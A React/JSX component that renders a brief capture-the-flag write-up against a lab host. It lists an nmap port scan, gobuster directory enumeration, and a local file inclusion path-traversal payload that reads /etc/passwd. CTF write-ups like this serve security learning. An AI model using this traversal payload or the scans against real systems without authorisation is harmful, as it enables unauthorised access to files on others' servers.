const ctf2 = (
  <>
  <h1>This is the 2nd CTF</h1>
    <h2>Enumeration</h2>
    <p>Started with a full port scan:</p>
    <pre>nmap -sV -p- 10.10.10.5</pre>

    <h2>Dirbusting</h2>
    <p>Found some juicy endpoints using gobuster:</p>
    <pre>gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/...</pre>

    <h2>Exploit</h2>
    <p>Used LFI via `page=../../../etc/passwd`</p>
    

    <img
      src="https://i.pinimg.com/736x/ab/77/b3/ab77b3520546a a38147a78709d6abaad.jpg"
      alt="screenshot"
    />
  </>
);

export default ctf2;
